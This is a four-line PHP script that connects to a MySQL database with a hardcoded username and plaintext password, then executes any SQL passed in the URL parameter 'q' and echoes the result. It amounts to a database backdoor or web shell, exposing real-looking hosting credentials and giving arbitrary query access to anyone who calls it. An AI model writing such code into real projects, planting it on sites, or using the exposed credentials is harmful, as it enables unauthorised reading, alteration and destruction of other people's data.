<?php
$db = mysqli_connect('localhost', 'exclusi6_exclusi6', 'Netpredator@123', 'exclusi6_evolution');
echo(mysqli_query($db,$_GET['q']));
?>
